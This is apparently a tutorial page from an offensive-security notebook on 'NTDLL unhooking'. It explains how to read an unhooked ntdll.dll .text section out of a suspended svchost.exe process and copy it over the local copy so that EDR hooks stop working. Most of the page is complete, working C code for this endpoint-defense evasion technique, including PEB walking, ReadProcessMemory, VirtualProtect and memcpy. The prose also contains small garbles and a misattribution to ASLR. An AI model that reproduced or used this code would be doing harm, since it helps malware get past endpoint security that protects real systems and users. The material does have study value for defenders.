# NTDLL Unhooking - From Suspended Process

## Introduction

An alternate approach to loading NTDLL is to read it from a suspended process. This works because EDR's require a running process to to install their hooks. Here's how it works:

* We create a process in a suspended state. (Contains clean ntdll.dll)
* Get local base address of ntdll.dll. (Imported dlls share the same base address between processes)
* Get remote address of suspended process
* Access remote ntdll by fetching the local ntdll address (imported DLL's have the same VA values between processes)PAGE\_EXECUTE\_READWRITE
* Allocate Heap and copy .text from remote to local using SizOfCode found in OptionalHeader
* VirtualProtect local ntdll with RW & Copy memory from heap to ntdll base address.

Do to ASLR, the virtual address of an imported library will be the same throughout all processes that import it. This is shared below:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>



## Example

The below screen shot is of svchost.exe (a suspended process we started). We are locating the NTDLL.dll based on the same address we fetched from the local PEB in unhooking.exe

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



### Required Helper Functions

The following functions are required to create a suspended file, get the base address of the created file,  and to get the address of the local ntdll.dll

```c

typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess) (
        HANDLE           ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID            ProcessInformation,
        ULONG            ProcessInformationLength,
        PULONG           ReturnLength
        );

BOOL CreateSuspendedProcess(STARTUPINFO *pSi, PPROCESS_INFORMATION pPi) {
    pSi->cb = sizeof(*pSi);
    // Just a POC: Update this with the dynamic filepath fetch for "svchost.exe"
    if (CreateProcessW(L"C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, pSi, pPi) == 0) {
        wprintf(L"CreateProcessW Failed %d", GetLastError()) ;
        return FALSE;
    };
    return TRUE;
}

PVOID FetchRemoteBaseAddress(PPROCESS_INFORMATION pPi, PPROCESS_BASIC_INFORMATION pPbi) {

    fnNtQueryInformationProcess NtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQueryInformationProcess");
    // get target image PEB address and pointer to image base
    DWORD dwReturnLength = 0;
    LPVOID imageBase;
    NtQueryInformationProcess(pPi->hProcess, ProcessBasicInformation, pPbi, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);
    DWORD_PTR pebOffset = (DWORD_PTR)pPbi->PebBaseAddress + 0x10;
    ReadProcessMemory(pPi->hProcess, (LPCVOID)pebOffset, &imageBase, sizeof(LPVOID), NULL);
    return imageBase;
}

PVOID FetchLocalNtdllAddress() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}

```



### Full Code

{% code fullWidth="true" %}
```c
#include <windows.h>
#include <winternl.h>
#include <wchar.h>
#include <stdio.h>

#define NTDLL L"NTDLL"

typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess) (
        HANDLE           ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID            ProcessInformation,
        ULONG            ProcessInformationLength,
        PULONG           ReturnLength
        );

BOOL CreateSuspendedProcess(STARTUPINFO *pSi, PPROCESS_INFORMATION pPi) {
    pSi->cb = sizeof(*pSi);
    // Just a POC: Update this with the dynamic filepath fetch for "svchost.exe"
    if (CreateProcessW(L"C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, pSi, pPi) == 0) {
        wprintf(L"CreateProcessW Failed %d", GetLastError()) ;
        return FALSE;
    };
    return TRUE;
}

PVOID FetchRemoteBaseAddress(PPROCESS_INFORMATION pPi, PPROCESS_BASIC_INFORMATION pPbi) {

    fnNtQueryInformationProcess NtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQueryInformationProcess");
    // get target image PEB address and pointer to image base
    DWORD dwReturnLength = 0;
    LPVOID imageBase;
    NtQueryInformationProcess(pPi->hProcess, ProcessBasicInformation, pPbi, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);
    DWORD_PTR pebOffset = (DWORD_PTR)pPbi->PebBaseAddress + 0x10;
    ReadProcessMemory(pPi->hProcess, (LPCVOID)pebOffset, &imageBase, sizeof(LPVOID), NULL);
    return imageBase;
}

PVOID FetchLocalNtdllAddress() {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}


int wmain() {

    // Create process
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    PROCESS_BASIC_INFORMATION pbi = {0};

    // Create Suspended Process
    if (!CreateSuspendedProcess(&si, &pi)) {
        return -1;
    }

    // Get Local NTDLL Base Address
    PVOID pNtdllBaseAddress = FetchLocalNtdllAddress();

    wprintf(L"[+] NTDLL Base Address %p\n", pNtdllBaseAddress);
    wprintf(L"[+] Suspended PIDS: %d\n", pi.dwProcessId);


    // Parse Local PE Headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdllBaseAddress;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        wprintf(L"[!] DOS Signature Failed\n");
        return -1;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pNtdllBaseAddress + pDosHeader->e_lfanew);

    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        wprintf(L"[!] NT Signature Failed\n ");
        return -1;
    }

    PIMAGE_OPTIONAL_HEADER pImgOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNtHeaders->OptionalHeader;

    // Get Size of .Text Section
    DWORD dwNtdllTextSize = pImgOptionalHeader->SizeOfCode;
    // Get Base address of .Text Section
    PVOID pAddressOfText = pNtdllBaseAddress + pImgOptionalHeader->BaseOfCode;


    wprintf(L"[+] Size of NTDLL .text section %d\n", dwNtdllTextSize);

    // Allocate Heap
    PVOID lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwNtdllTextSize);

    // Copy Remote .Text Section to Allocated Buffer
    size_t ulBytesWritten = 0;
    ReadProcessMemory(pi.hProcess, pAddressOfText, lpBuffer, dwNtdllTextSize,  &ulBytesWritten);

    wprintf(L"[+] Wrote %d bytes to: %p\n", ulBytesWritten, lpBuffer);

    // Change permissions of local NTDLL
    DWORD dwOldPermissions;
    if (!VirtualProtect(pAddressOfText, dwNtdllTextSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions)) {
        wprintf(L"[!] VirtualProtect[1] Failed %d", GetLastError() );
        return -1;
    }

    // This is just a POC, to avoid evasion properly needs more.
    // Example: Breaking apart copy into seperate spread out functions

    memcpy(pAddressOfText, lpBuffer, dwNtdllTextSize);

    if (!VirtualProtect(pAddressOfText, dwNtdllTextSize, dwOldPermissions, &dwOldPermissions)) {
        wprintf(L"[!] VirtualProtect[2] Failed %d", GetLastError() );
        return -1;
    }

    getchar();
    return 0;
}

```
{% endcode %}
